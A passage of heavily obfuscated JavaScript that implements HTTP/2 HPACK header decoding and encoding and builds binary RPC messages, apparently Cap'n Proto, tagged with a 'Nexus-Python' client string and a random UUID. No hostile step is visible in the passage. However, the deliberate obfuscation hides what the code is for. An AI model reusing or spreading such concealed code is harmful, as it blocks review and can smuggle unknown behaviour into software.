        0x17,
        0x16,
        0x17,
        0x17,
        0x17,
        0x17,
        0x17,
        0x18,
        0x17,
        0x18,
        0x18,
        0x16,
        0x17,
        0x18,
        0x17,
        0x17,
        0x17,
        0x17,
        0x15,
        0x16,
        0x17,
        0x16,
        0x17,
        0x17,
        0x18,
        0x16,
        0x15,
        0x14,
        0x16,
        0x16,
        0x17,
        0x17,
        0x15,
        0x17,
        0x16,
        0x16,
        0x18,
        0x15,
        0x16,
        0x17,
        0x17,
        0x15,
        0x15,
        0x16,
        0x15,
        0x17,
        0x16,
        0x17,
        0x17,
        0x14,
        0x16,
        0x16,
        0x16,
        0x17,
        0x16,
        0x16,
        0x17,
        0x1a,
        0x1a,
        0x14,
        0x13,
        0x16,
        0x17,
        0x16,
        0x19,
        0x1a,
        0x1a,
        0x1a,
        0x1b,
        0x1b,
        0x1a,
        0x18,
        0x19,
        0x13,
        0x15,
        0x1a,
        0x1b,
        0x1b,
        0x1a,
        0x1b,
        0x18,
        0x15,
        0x15,
        0x1a,
        0x1a,
        0x1c,
        0x1b,
        0x1b,
        0x1b,
        0x14,
        0x18,
        0x14,
        0x15,
        0x16,
        0x15,
        0x15,
        0x17,
        0x16,
        0x16,
        0x19,
        0x19,
        0x18,
        0x18,
        0x1a,
        0x17,
        0x1a,
        0x1b,
        0x1a,
        0x1a,
        0x1b,
        0x1b,
        0x1b,
        0x1b,
        0x1b,
        0x1c,
        0x1b,
        0x1b,
        0x1b,
        0x1b,
        0x1b,
        0x1a,
        0x1e
    ];
function a0aa() {
    const cZ = a0aY, a = {
            'EOhPJ': function (c, d) {
                return c < d;
            },
            'qqVBU': function (c, d) {
                return c - d;
            },
            'cibSA': function (c, d) {
                return c >= d;
            },
            'CjXGT': function (c, d) {
                return c & d;
            },
            'uacwL': function (c, d) {
                return c >> d;
            },
            'MCEDI': function (c, d) {
                return c === d;
            },
            'PJabZ': function (c, d) {
                return c + d;
            }
        }, b = [
            null,
            null,
            -0x1,
            0x0
        ];
    for (let c = 0x0; a[cZ(0x7d1)](c, a0a8['length']); c++) {
        const d = a0a8[c], f = a0a9[c];
        let g = b;
        for (let h = a[cZ(0x596)](f, 0x1); a[cZ(0x6be)](h, 0x0); h--) {
            const i = a[cZ(0x189)](a[cZ(0x134)](d, h), 0x1);
            a['MCEDI'](g[i], null) && (g[i] = [
                null,
                null,
                -0x1,
                a[cZ(0x54e)](g[0x3], 0x1)
            ]), g = g[i];
        }
        g[0x2] = c;
    }
    return b;
}
const a0ab = a0aa();
function a0ac(a) {
    const d0 = a0aY, b = {
            'uNJkk': function (h, i) {
                return h >= i;
            },
            'bKXek': function (h, i) {
                return h & i;
            },
            'jNsPU': function (h, i) {
                return h << i;
            },
            'PitOG': function (h, i) {
                return h === i;
            },
            'cXOEo': d0(0x4e0),
            'IzKTa': d0(0x13a),
            'oYQKD': d0(0x3e6),
            'seIQK': function (h, i) {
                return h !== i;
            },
            'sBtYv': function (h, i) {
                return h - i;
            },
            'YTmsI': d0(0x31a)
        }, c = [];
    let d = a0ab, f = 0x0, g = 0x0;
    for (const h of a) {
        for (let i = 0x7; b['uNJkk'](i, 0x0); i--) {
            const j = b[d0(0x3e5)](h >> i, 0x1);
            f = b[d0(0x36f)](f, 0x1) | j, g += 0x1, d = d[j];
            if (b['PitOG'](d, null))
                throw new Error(b[d0(0x425)]);
            if (b[d0(0x360)](d[0x2], 0x0)) {
                const k = b['IzKTa']['split']('|');
                let l = 0x0;
                while (!![]) {
                    switch (k[l++]) {
                    case '0':
                        f = 0x0;
                        continue;
                    case '1':
                        if (b[d0(0x6ac)](d[0x2], 0x100))
                            throw new Error(b[d0(0x283)]);
                        continue;
                    case '2':
                        g = 0x0;
                        continue;
                    case '3':
                        c[d0(0x560)](d[0x2]);
                        continue;
                    case '4':
                        d = a0ab;
                        continue;
                    }
                    break;
                }
            }
        }
    }
    if (g > 0x7 || b[d0(0x47c)](f, b[d0(0x157)](0x1 << g, 0x1)))
        throw new Error(b['YTmsI']);
    return Buffer['from'](c);
}
function a0ad(a, b, c) {
    const d1 = a0aY, d = {
            'wMbyz': function (j, k) {
                return j >= k;
            },
            'qNsRW': d1(0x4f3),
            'ITHoJ': function (j, k) {
                return j - k;
            },
            'rJnsR': function (j, k) {
                return j << k;
            },
            'NqNxQ': function (j, k) {
                return j & k;
            },
            'WaOaH': function (j, k) {
                return j < k;
            },
            'tVDCU': function (j, k) {
                return j >= k;
            },
            'qZDOK': function (j, k) {
                return j * k;
            },
            'YPiyS': function (j, k) {
                return j & k;
            },
            'FWHxJ': function (j, k) {
                return j === k;
            },
            'YDCxX': function (j, k) {
                return j & k;
            },
            'wptCP': function (j, k) {
                return j > k;
            },
            'zSWIV': d1(0x167)
        };
    if (d[d1(0x491)](b, a[d1(0x7bc)]))
        throw new Error(d['qNsRW']);
    const f = a[b];
    b += 0x1;
    const g = d[d1(0x592)](d[d1(0x45f)](0x1, c), 0x1);
    let h = d['NqNxQ'](f, g);
    if (d['WaOaH'](h, g))
        return [
            h,
            b
        ];
    let i = 0x0;
    while (!![]) {
        if (d['tVDCU'](b, a[d1(0x7bc)]))
            throw new Error(d[d1(0x26e)]);
        const j = a[b];
        b += 0x1, h += d[d1(0x765)](d[d1(0x5f7)](j, 0x7f), Math[d1(0x562)](0x2, i));
        if (d[d1(0x219)](d[d1(0x571)](j, 0x80), 0x0))
            return [
                h,
                b
            ];
        i += 0x7;
        if (d[d1(0xcc)](i, 0x1c))
            throw new Error(d['zSWIV']);
    }
}
function a0ae(a, b) {
    const d2 = a0aY, c = {
            'QPCjF': 'truncated\x20HPACK\x20string',
            'yOYGn': function (j, k) {
                return j(k);
            },
            'nQyxB': function (j, k) {
                return j & k;
            },
            'yWxrK': function (j, k) {
                return j + k;
            },
            'RSwFp': d2(0x6ba)
        };
    if (b >= a[d2(0x7bc)])
        throw new Error(c[d2(0x34a)]);
    const d = c[d2(0x238)](Boolean, c['nQyxB'](a[b], 0x80)), [f, g] = a0ad(a, b, 0x7), h = c[d2(0x62c)](g, f);
    if (h > a[d2(0x7bc)])
        throw new Error(c[d2(0x6d9)]);
    const i = a[d2(0x805)](g, h);
    return [
        d ? c['yOYGn'](a0ac, i) : i,
        h
    ];
}
class a0af {
    constructor() {
        const d3 = a0aY;
        this[d3(0x7b2)] = [], this[d3(0x7f8)] = 0x0, this[d3(0x20f)] = 0x1000;
    }
    [a0aY(0x276)](a) {
        const d4 = a0aY, b = {
                'Ehhan': function (d, f) {
                    return d <= f;
                },
                'YbKKj': d4(0x34f),
                'vHQJM': function (d, f) {
                    return d - f;
                },
                'SlUwM': function (d, f) {
                    return d < f;
                },
                'EXLcV': function (d, f) {
                    return d >= f;
                },
                'Ydpge': d4(0xdc)
            };
        if (b[d4(0x306)](a, 0x0))
            throw new Error(b['YbKKj']);
        if (b['Ehhan'](a, a0a7['length']))
            return a0a7[a - 0x1];
        const c = b[d4(0x6ff)](a, a0a7[d4(0x7bc)]) - 0x1;
        if (b[d4(0x26f)](c, 0x0) || b['EXLcV'](c, this[d4(0x7b2)][d4(0x7bc)]))
            throw new Error(b[d4(0x502)]);
        return this[d4(0x7b2)][c];
    }
    ['add'](a, b) {
        const d5 = a0aY, c = {
                'MdjdB': function (f, g) {
                    return f + g;
                },
                'TWQou': function (f, g) {
                    return f + g;
                },
                'zgxBu': d5(0x31e),
                'NTgwe': function (f, g) {
                    return f > g;
                },
                'louJn': function (f, g) {
                    return f + g;
                },
                'yXPzj': function (f, g) {
                    return f + g;
                }
            }, d = c[d5(0x29a)](c[d5(0x1c2)](0x20, Buffer[d5(0xe0)](a, c[d5(0x40c)])), Buffer['byteLength'](b, c[d5(0x40c)]));
        if (c['NTgwe'](d, this['maxSize'])) {
            this[d5(0x7b2)] = [], this['dynamicSize'] = 0x0;
            return;
        }
        while (this[d5(0x7b2)][d5(0x7bc)] > 0x0 && this[d5(0x7f8)] + d > this[d5(0x20f)]) {
            const [f, g] = this[d5(0x7b2)][d5(0x3ea)]();
            this[d5(0x7f8)] -= c[d5(0x1d6)](c['yXPzj'](0x20, Buffer[d5(0xe0)](f, c[d5(0x40c)])), Buffer[d5(0xe0)](g, c[d5(0x40c)]));
        }
        this[d5(0x7b2)]['unshift']([
            a,
            b
        ]), this['dynamicSize'] += d;
    }
    [a0aY(0x376)](a) {
        const d6 = a0aY, b = {
                'JhiaQ': function (f, g) {
                    return f < g;
                },
                'LstTh': function (f, g) {
                    return f & g;
                },
                'aiIOu': function (f, g, h, i) {
                    return f(g, h, i);
                },
                'yAxkY': function (f, g, h) {
                    return f(g, h);
                },
                'uZvur': d6(0x31e),
                'YYGlX': function (f, g) {
                    return f & g;
                },
                'ySMAo': function (f, g, h, i) {
                    return f(g, h, i);
                },
                'brGVI': function (f, g) {
                    return f > g;
                },
                'bGAth': function (f, g) {
                    return f > g;
                },
                'ToRna': function (f, g) {
                    return f > g;
                },
                'ZWrgM': function (f, g) {
                    return f + g;
                },
                'vUGYl': function (f, g, h) {
                    return f(g, h);
                }
            }, c = [];
        let d = 0x0;
        while (b['JhiaQ'](d, a[d6(0x7bc)])) {
            const f = a[d];
            if (b[d6(0x847)](f, 0x80)) {
                let j;
                [j, d] = b[d6(0xd8)](a0ad, a, d, 0x7), c[d6(0x560)](this[d6(0x276)](j));
                continue;
            }
            if (b[d6(0x847)](f, 0x40)) {
                let k, l;
                [k, d] = a0ad(a, d, 0x6);
                if (k)
                    l = this[d6(0x276)](k)[0x0];
                else {
                    let o;
                    [o, d] = b[d6(0x152)](a0ae, a, d), l = o[d6(0xec)](b[d6(0x558)])[d6(0x4ee)]();
                }
                let m;
                [m, d] = a0ae(a, d);
                const n = m[d6(0xec)](d6(0x31e));
                this['add'](l, n), c[d6(0x560)]([
                    l,
                    n
                ]);
                continue;
            }
            if (b[d6(0x298)](f, 0x20)) {
                let p;
                [p, d] = b[d6(0x383)](a0ad, a, d, 0x5);
                if (b[d6(0x18e)](p, 0x1000))
                    throw new Error(d6(0x22c));
                this[d6(0x20f)] = p;
                while (b[d6(0x4f4)](this[d6(0x7b2)]['length'], 0x0) && b[d6(0x4d3)](this[d6(0x7f8)], p)) {
                    const [q, r] = this[d6(0x7b2)][d6(0x3ea)]();
                    this[d6(0x7f8)] -= b[d6(0x130)](b[d6(0x130)](0x20, Buffer['byteLength'](q, b['uZvur'])), Buffer[d6(0xe0)](r, b[d6(0x558)]));
                }
                continue;
            }
            let g, h;
            [g, d] = a0ad(a, d, 0x4);
            if (g)
                h = this[d6(0x276)](g)[0x0];
            else {
                let s;
                [s, d] = b['yAxkY'](a0ae, a, d), h = s[d6(0xec)](b[d6(0x558)])[d6(0x4ee)]();
            }
            let i;
            [i, d] = b['vUGYl'](a0ae, a, d), c[d6(0x560)]([
                h,
                i['toString'](b[d6(0x558)])
            ]);
        }
        return c;
    }
}
function a0ag(a, b, c) {
    const d7 = a0aY, d = {
            'kzLHF': function (h, i) {
                return h << i;
            },
            'KwMSG': function (h, i) {
                return h < i;
            },
            'dqvlZ': function (h, i) {
                return h | i;
            },
            'zCSKJ': function (h, i) {
                return h >= i;
            },
            'qQYEP': function (h, i) {
                return h & i;
            },
            'PIgZp': function (h, i) {
                return h / i;
            }
        }, f = d['kzLHF'](0x1, b) - 0x1;
    if (d[d7(0x5dd)](a, f))
        return Buffer['from']([c | a]);
    const g = [d['dqvlZ'](c, f)];
    a -= f;
    while (d['zCSKJ'](a, 0x80)) {
        g[d7(0x560)](d['dqvlZ'](d[d7(0x213)](a, 0x7f), 0x80)), a = Math['floor'](d[d7(0x333)](a, 0x80));
    }
    return g['push'](a), Buffer[d7(0x664)](g);
}
function a0ah(a) {
    const d8 = a0aY, b = { 'QxixH': d8(0x31e) }, c = Buffer[d8(0x664)](a, b[d8(0x5f8)]);
    return Buffer['concat']([
        a0ag(c[d8(0x7bc)], 0x7, 0x0),
        c
    ]);
}
function a0ai(a) {
    const d9 = a0aY, b = {
            'aGFig': function (d, f) {
                return d === f;
            },
            'iQcBh': function (d, f) {
                return d === f;
            },
            'VBrVS': d9(0x31f),
            'ogCtx': d9(0xf6),
            'RJVPS': d9(0x6e3),
            'DSXES': d9(0x6c6),
            'QguJe': function (d, f) {
                return d === f;
            },
            'vTDpO': d9(0x66c),
            'NeECr': '500',
            'jAtUv': function (d, f, g, h) {
                return d(f, g, h);
            }
        }, c = [];
    for (const [d, f] of a) {
        if (b['aGFig'](d, d9(0xf6)) && b[d9(0x126)](f, '200'))
            c[d9(0x560)](0x88);
        else {
            if (b[d9(0x126)](d, d9(0xf6)) && b[d9(0x782)](f, b[d9(0x747)]))
                c[d9(0x560)](0x89);
            else {
                if (b[d9(0x126)](d, b['ogCtx']) && b[d9(0x782)](f, b['RJVPS']))
                    c[d9(0x560)](0x8a);
                else {
                    if (b[d9(0x126)](d, b['ogCtx']) && f === b[d9(0x17f)])
                        c[d9(0x560)](0x8b);
                    else {
                        if (b[d9(0x782)](d, b[d9(0x192)]) && f === d9(0x3f2))
                            c[d9(0x560)](0x8c);
                        else {
                            if (b['aGFig'](d, b[d9(0x192)]) && b[d9(0x81a)](f, b[d9(0x800)]))
                                c[d9(0x560)](0x8d);
                            else
                                b[d9(0x81a)](d, b[d9(0x192)]) && f === b[d9(0x1c0)] ? c[d9(0x560)](0x8e) : (c[d9(0x560)](...b[d9(0xd3)](a0ag, 0x0, 0x4, 0x0)), c[d9(0x560)](...a0ah(d)), c['push'](...a0ah(f)));
                        }
                    }
                }
            }
        }
    }
    return Buffer['from'](c);
}
class a0aj {
    constructor() {
        this['words'] = [];
    }
    [a0aY(0x4b7)](a) {
        const da = a0aY, b = {
                'ZbXGj': function (d, f) {
                    return d < f;
                }
            }, c = this[da(0x714)][da(0x7bc)];
        for (let d = 0x0; b[da(0x208)](d, a); d++) {
            this[da(0x714)][da(0x560)](0x0n);
        }
        return c;
    }
    [a0aY(0x2ae)](a, b, c, d) {
        const db = a0aY, f = {
                'lRfWm': function (j, k) {
                    return j - k;
                },
                'ZtgPK': function (j, k) {
                    return j & k;
                },
                'CCxmX': function (j, k) {
                    return j << k;
                },
                'vSqDW': function (j, k) {
                    return j(k);
                },
                'YAUbt': function (j, k) {
                    return j & k;
                },
                'UqPcg': function (j, k) {
                    return j << k;
                },
                'UERrZ': function (j, k) {
                    return j(k);
                },
                'ihfww': function (j, k) {
                    return j | k;
                }
            }, g = f[db(0x6a6)](b - a, 0x1), h = f[db(0x6b5)](f['CCxmX'](f['vSqDW'](BigInt, g), 0x2n), 0xfffffffcn), i = f[db(0x595)](BigInt, f[db(0x1ae)](c, 0xffff)) | f['UqPcg'](f[db(0x27e)](BigInt, f[db(0x1ae)](d, 0xffff)), 0x10n);
        this['words'][a] = f[db(0x2e8)](h, f[db(0x51a)](i, 0x20n));
    }
    [a0aY(0x5e7)](a, b, c) {
        const dc = a0aY, d = {
                'UhIBl': function (g, h) {
                    return g << h;
                },
                'coYOY': function (g, h) {
                    return g(h);
                },
                'SMBZD': function (g, h) {
                    return g * h;
                },
                'cMcun': function (g, h) {
                    return g | h;
                },
                'bUsQZ': function (g, h) {
                    return g & h;
                },
                'vnzug': function (g, h) {
                    return g(h);
                }
            }, f = d[dc(0x485)](0xffn, d[dc(0x16b)](BigInt, d[dc(0x362)](b, 0x8)));
        this[dc(0x714)][a] = d[dc(0x663)](d['bUsQZ'](this[dc(0x714)][a], ~f), d[dc(0x485)](d[dc(0x3c5)](BigInt, d['bUsQZ'](c, 0xff)), d[dc(0x3c5)](BigInt, b * 0x8)));
    }
    [a0aY(0x2db)](a, b, c) {
        const dd = a0aY, d = {
                'XkhAy': function (g, h) {
                    return g << h;
                },
                'yJpsa': function (g, h) {
                    return g(h);
                },
                'IiYnw': function (g, h) {
                    return g * h;
                },
                'ikJEQ': function (g, h) {
                    return g | h;
                },
                'OltXX': function (g, h) {
                    return g & h;
                }
            }, f = d[dd(0x1dd)](0xffffn, d[dd(0x66e)](BigInt, d[dd(0x658)](b, 0x8)));
        this[dd(0x714)][a] = d[dd(0x752)](d[dd(0x70e)](this['words'][a], ~f), d['XkhAy'](d[dd(0x66e)](BigInt, c & 0xffff), d[dd(0x66e)](BigInt, d[dd(0x658)](b, 0x8))));
    }
    [a0aY(0x3c7)](a, b, c) {
        const de = a0aY, d = {
                'qdbQw': function (g, h) {
                    return g << h;
                },
                'IzrBJ': function (g, h) {
                    return g(h);
                },
                'QGyga': function (g, h) {
                    return g * h;
                },
                'RtJNh': function (g, h) {
                    return g | h;
                },
                'xYcqD': function (g, h) {
                    return g << h;
                },
                'OcnZZ': function (g, h) {
                    return g & h;
                },
                'zPeaZ': function (g, h) {
                    return g * h;
                }
            }, f = d[de(0x5bf)](0xffffffffn, d[de(0x204)](BigInt, d[de(0x272)](b, 0x8)));
        this[de(0x714)][a] = d['RtJNh'](this[de(0x714)][a] & ~f, d['xYcqD'](BigInt(d['OcnZZ'](c, 0xffffffff)), BigInt(d[de(0x79d)](b, 0x8))));
    }
    [a0aY(0x444)](a, b) {
        const df = a0aY, c = {
                'zFOvQ': function (d, f) {
                    return d & f;
                },
                'GGmDM': function (d, f) {
                    return d(f);
                }
            };
        this['words'][a] = c['zFOvQ'](c[df(0x5c2)](BigInt, b), 0xffffffffffffffffn);
    }
    [a0aY(0x647)](a, b, c = ![]) {
        const dg = a0aY, d = {
                'laulN': function (m, n) {
                    return m === n;
                },
                'ARqtY': dg(0x446),
                'ntcRn': function (m, n) {
                    return m / n;
                },
                'wdSyc': function (m, n) {
                    return m & n;
                },
                'uQcJe': function (m, n) {
                    return m | n;
                },
                'WamKp': function (m, n) {
                    return m(n);
                },
                'NGVXp': function (m, n) {
                    return m & n;
                },
                'enajg': function (m, n) {
                    return m << n;
                }
            }, f = d['laulN'](typeof b, d[dg(0x4b9)]) ? Buffer[dg(0x664)](b, 'utf8') : b, g = f[dg(0x7bc)] + (c ? 0x1 : 0x0), h = this[dg(0x4b7)](Math[dg(0x785)](g / 0x8));
        for (let m = 0x0; m < f[dg(0x7bc)]; m++) {
            this[dg(0x5e7)](h + Math[dg(0x15d)](d['ntcRn'](m, 0x8)), m % 0x8, f[m]);
        }
        const j = h - a - 0x1, k = d['wdSyc'](d['uQcJe'](BigInt(j) << 0x2n, 0x1n), 0xffffffffn), l = d[dg(0x3ac)](0x2n, d[dg(0x5fe)](BigInt, d[dg(0x9d)](g, 0x1fffffff)) << 0x3n);
        this[dg(0x714)][a] = d[dg(0x3ac)](k, d[dg(0x171)](l, 0x20n));
    }
    [a0aY(0xf1)](a, b) {
        const dh = a0aY, c = {
                'LAsXb': function (g, h) {
                    return g - h;
                },
                'jngRw': function (g, h) {
                    return g | h;
                },
                'hTmcV': function (g, h) {
                    return g & h;
                },
                'FLhTH': function (g, h) {
                    return g(h);
                },
                'iwSrp': function (g, h) {
                    return g << h;
                },
                'jaRXR': function (g, h) {
                    return g | h;
                },
                'CRRag': function (g, h) {
                    return g < h;
                },
                'niihy': function (g, h) {
                    return g + h;
                }
            };
        if (!b[dh(0x7bc)]) {
            this['words'][a] = 0x0n;
            return;
        }
        const d = this[dh(0x4b7)](b['length']), f = c[dh(0x537)](c['LAsXb'](d, a), 0x1);
        this[dh(0x714)][a] = c[dh(0x2d2)](c[dh(0x4cc)](c[dh(0x2d2)](c[dh(0x3be)](BigInt, f) << 0x2n, 0x1n), 0xffffffffn), c[dh(0x7e6)](c[dh(0x429)](0x6n, c['FLhTH'](BigInt, b[dh(0x7bc)]) << 0x3n), 0x20n));
        for (let g = 0x0; c['CRRag'](g, b[dh(0x7bc)]); g++) {
            this[dh(0x647)](c[dh(0x163)](d, g), b[g], !![]);
        }
    }
    [a0aY(0x1c9)]() {
        const di = a0aY, a = {
                'IKeIt': function (d, f) {
                    return d * f;
                },
                'rLjPB': function (d, f) {
                    return d < f;
                },
                'ZsAVd': function (d, f) {
                    return d & f;
                }
            }, b = Buffer['alloc'](0x8);
        b[di(0x409)](0x0, 0x0), b[di(0x409)](this[di(0x714)][di(0x7bc)], 0x4);
        const c = Buffer[di(0x4b7)](a['IKeIt'](this['words'][di(0x7bc)], 0x8));
        for (let d = 0x0; a['rLjPB'](d, this[di(0x714)][di(0x7bc)]); d++) {
            c[di(0x35b)](a[di(0x61e)](this[di(0x714)][d], 0xffffffffffffffffn), d * 0x8);
        }
        return Buffer['concat']([
            b,
            c
        ]);
    }
}
function a0ak(a) {
    const dj = a0aY, b = new a0aj(), c = b[dj(0x4b7)](0x1), d = b[dj(0x4b7)](0x1), f = b[dj(0x4b7)](0x1);
    b[dj(0x2ae)](c, d, 0x1, 0x1), b[dj(0x2db)](d, 0x0, 0x8);
    const g = b[dj(0x4b7)](0x1);
    return b[dj(0x4b7)](0x1), b[dj(0x2ae)](f, g, 0x1, 0x1), b[dj(0x3c7)](g, 0x0, a), b['finish']();
}
function a0al(a, b, c, d, f, g) {
    const dk = a0aY, h = {
            'cfpUu': function (H, I) {
                return H | I;
            },
            'dwxUl': function (H, I) {
                return H & I;
            },
            'VqAlV': function (H, I) {
                return H | I;
            },
            'HfxmN': dk(0x632),
            'hKcni': dk(0x78e),
            'YJlSa': dk(0x243),
            'Yaach': 'Nexus-Python'
        }, i = new a0aj(), j = i[dk(0x4b7)](0x1), k = i[dk(0x4b7)](0x1), l = i['alloc'](0x1);
    i['structPtr'](j, k, 0x1, 0x1), i[dk(0x2db)](k, 0x0, 0x2);
    const m = i[dk(0x4b7)](0x1), n = i[dk(0x4b7)](0x1);
    i[dk(0x4b7)](0x1);
    const o = i['alloc'](0x1), p = i[dk(0x4b7)](0x1);
    i['alloc'](0x1), i[dk(0x2ae)](l, m, 0x3, 0x3), i[dk(0x3c7)](m, 0x0, a), i[dk(0x444)](n, 0xf71695ec7fe85497n);
    const q = i[dk(0x4b7)](0x1), r = i[dk(0x4b7)](0x1);
    i[dk(0x2ae)](o, q, 0x1, 0x1), i['setU16'](q, 0x4, 0x1);
    const s = i[dk(0x4b7)](0x1);
    i[dk(0x4b7)](0x1), i[dk(0x2ae)](r, s, 0x1, 0x1), i['setU32'](s, 0x0, b);
    const t = i[dk(0x4b7)](0x1);
    i['alloc'](0x1), i[dk(0x2ae)](p, t, 0x0, 0x2);
    const u = i['alloc'](0x1), v = i[dk(0x4b7)](0x1), w = i[dk(0x4b7)](0x1), x = i['alloc'](0x1);
    i[dk(0x2ae)](t, u, 0x1, 0x3), i[dk(0x5e7)](u, 0x0, g);
    const y = i[dk(0x4b7)](0x1), z = i[dk(0x4b7)](0x1);
    i[dk(0x2ae)](v, y, 0x0, 0x2), i[dk(0x647)](y, c, !![]), i[dk(0x647)](z, d), i[dk(0x647)](w, f);
    const A = i['alloc'](0x1), B = i[dk(0x4b7)](0x1);
    i[dk(0x4b7)](0x1), i[dk(0x2ae)](x, A, 0x1, 0x2);
    const C = i[dk(0x4b7)](0x1), D = i[dk(0x4b7)](0x1), E = i['alloc'](0x1), F = i[dk(0x4b7)](0x1);
    i[dk(0x2ae)](B, C, 0x0, 0x4);
    const G = a0k['randomBytes'](0x10);
    return G[0x6] = h['cfpUu'](h['dwxUl'](G[0x6], 0xf), 0x40), G[0x8] = h[dk(0x220)](h[dk(0x7be)](G[0x8], 0x3f), 0x80), i[dk(0x647)](C, G), i[dk(0xf1)](D, [
        h[dk(0x153)],
        h[dk(0x16c)]
    ]), i['writeBytes'](E, h['YJlSa'], !![]), i[dk(0x647)](F, h[dk(0xb5)], !![]), i[dk(0x1c9)]();
}
function a0am(a) {
    const dl = a0aY, b = {
            'XXQtd': function (f, g) {
                return f >= g;
            },
            'vJNNj': function (f, g) {
                return f - g;
            },
            'ygnBx': function (f, g) {
                return f + g;
            },
            'fYYTg': function (f, g) {
                return f + g;
            },
            'BIYFG': function (f, g) {
                return f % g;
            },
            'owgCb': function (f, g) {
                return f < g;
            },
            'yvIBI': function (f, g) {
                return f - g;
            },
            'LKjIr': function (f, g) {
                return f * g;
            },
            'zDcCT': function (f, g) {
                return f !== g;
            },
            'yMJxQ': function (f, g) {
                return f + g;
            }
        }, c = [];
    let d = 0x0;
    while (b[dl(0xa3)](b[dl(0x41d)](a[dl(0x7bc)], d), 0x8)) {
        const f = a[dl(0x300)](d), g = a[dl(0x300)](b['ygnBx'](d, 0x4)), h = b[dl(0x411)](f, 0x1);
        let j = b['fYYTg'](0x2, h), k = j * 0x4;
        b['BIYFG'](k, 0x8) && (k += 0x4);
        if (b[dl(0x591)](b[dl(0x41c)](a[dl(0x7bc)], d), k))
            break;
        const l = [g];
        for (let n = 0x1; n < h; n++) {
            l[dl(0x560)](a[dl(0x300)](b[dl(0x401)](d, 0x4) + n * 0x4));
        }
        const m = k + b[dl(0x675)](l[dl(0x2da)]((o, p) => o + p, 0x0), 0x8);
        if (b['owgCb'](a['length'] - d, m))
            break;
        if (b[dl(0x64d)](h, 0x1))
            throw new Error(dl(0x287));
        c[dl(0x560)](a[dl(0x805)](b[dl(0x381)](d, k), d + m)), d += m;
    }
    return [
        c,
        a[dl(0x805)](d)
    ];
}
function a0an(a, b) {
    const dm = a0aY, c = {
            'Npjid': dm(0x840),
            'BmWQp': function (j, k) {
                return j !== k;
            },
            'pUVOW': function (j, k) {
                return j & k;
            },
            'sckUw': dm(0x82e),
            'KrWXK': function (j, k) {
                return j & k;
            },
            'nvwIL': function (j, k) {
                return j >> k;
            },
            'RTMXy': function (j, k) {
                return j & k;
            },
            'eVQkL': function (j, k) {
                return j + k;
            },
            'xZYWh': function (j, k) {
                return j(k);
            },
            'imMuz': function (j, k) {
                return j >> k;
            },
            'jAFvk': function (j, k) {
                return j(k);
            },
            'ZkHDr': function (j, k) {
                return j >> k;
            },
            'sKMUx': function (j, k) {
                return j < k;
            },
            'okadb': function (j, k) {
                return j > k;
            },
            'SLunc': function (j, k) {
                return j + k;
            }
        };
    if (b >= a[dm(0x7bc)])
        throw new Error(c[dm(0x231)]);
    const d = a[b];
    if (c[dm(0x304)](c[dm(0x7df)](d, 0x3n), 0x0n))
        throw new Error(c[dm(0x28e)]);
    let f = c[dm(0x1a5)](c['nvwIL'](d, 0x2n), 0x3fffffffn);
    c[dm(0x116)](f, 0x20000000n) && (f -= 0x40000000n);
    const g = c[dm(0x73b)](c[dm(0x73b)](b, 0x1), c[dm(0x71d)](Number, f)), h = c[dm(0x71d)](Number, c[dm(0x7df)](c[dm(0x563)](d, 0x20n), 0xffffn)), i = c['jAFvk'](Number, c[dm(0x1a5)](c[dm(0x618)](d, 0x30n), 0xffffn));
    if (c[dm(0x58c)](g, 0x0) || c[dm(0x1e9)](c['eVQkL'](c['SLunc'](g, h), i), a[dm(0x7bc)]))
        throw new Error(c['Npjid']);
    return [
        g,
        h,
        i
    ];
}
function a0ao(a, b) {
    const dn = a0aY, c = {
            'GBWnP': function (m, n) {
                return m >= n;
            },
            'YAsaB': function (m, n) {
                return m !== n;
            },
            'GvJRl': function (m, n) {
                return m & n;
            },
            'OhHLU': function (m, n) {
                return m >> n;
            },
            'BxVkN': function (m, n) {
                return m & n;
            },
            'IpDCo': function (m, n) {
                return m + n;
            },
            'BpNQV': function (m, n) {
                return m(n);
            },
            'QgbXh': function (m, n) {
                return m(n);
            },
            'eXNCO': function (m, n) {
                return m >> n;
            },
            'dSZfP': function (m, n) {
                return m(n);
            },
            'hhTzc': function (m, n) {
                return m / n;
            },
            'Faojd': function (m, n) {
                return m < n;
            },
            'YxNDA': function (m, n) {
                return m > n;
            },
            'yMvCa': function (m, n) {
                return m & n;
            },
            'ygFRb': function (m, n) {
                return m * n;
            },
            'SUYkp': dn(0x31e)
        };
    if (c['GBWnP'](b, a['length']))
        return '';
    const d = a[b];
    if (c[dn(0x62d)](c[dn(0x2a5)](d, 0x3n), 0x1n))
        return '';
    let f = c[dn(0x2a5)](c['OhHLU'](d, 0x2n), 0x3fffffffn);
    c[dn(0x7a6)](f, 0x20000000n) && (f -= 0x40000000n);
    const g = c[dn(0x74a)](c[dn(0x74a)](b, 0x1), c[dn(0x184)](Number, f)), h = c['QgbXh'](Number, c['eXNCO'](d, 0x20n) & 0x7n), j = c[dn(0x7d5)](Number, d >> 0x23n), k = Math[dn(0x785)](c[dn(0x5d7)](j, 0x8));
    if (h !== 0x2 || c[dn(0x402)](g, 0x0) || c[dn(0x74f)](g + k, a[dn(0x7bc)]))
        return '';
    const l = Buffer[dn(0x4b7)](k * 0x8);
    for (let m = 0x0; c[dn(0x402)](m, k); m++) {
        l[dn(0x35b)](c[dn(0x27b)](a[c[dn(0x74a)](g, m)], 0xffffffffffffffffn), c[dn(0x71c)](m, 0x8));
    }
    return l[dn(0x805)](0x0, j)[dn(0xec)](c[dn(0x802)])['replace'](/\0+$/, '');
}
function a0ap(a) {
    const dp = a0aY, b = {
            'LsdkU': dp(0x79a),
            'VDBeC': function (z, A) {
                return z / A;
            },
            'CfQdT': function (z, A) {
                return z * A;
            },
            'rjTqx': function (y, z, A) {
                return y(z, A);
            },
            'fnCzi': function (z, A) {
                return z < A;
            },
            'QWjqn': function (z, A) {
                return z & A;
            },
            'YiwQL': dp(0x7ec),
            'OZIym': function (y, z, A) {
                return y(z, A);
            },
            'qgNod': function (z, A) {
                return z + A;
            },
            'IFZwT': function (z, A) {
                return z >> A;
            },
            'BLkWt': function (z, A) {
                return z === A;
            },
            'RuCwK': function (y, z, A) {
                return y(z, A);
            },
            'lhgfl': function (z, A) {
                return z !== A;
            },
            'VzDrg': function (z, A) {
                return z + A;
            },
            'uBlBS': 'RPC\x20return\x20union\x20',
            'dqyof': function (y, z) {
                return y(z);
            },
            'oTfxy': function (z, A) {
                return z & A;
            },
            'wljOU': function (z, A) {
                return z + A;
            },
            'RVvfm': function (z, A) {
                return z !== A;
            },
            'PlVjz': dp(0x478),
            'ovjGH': function (z, A) {
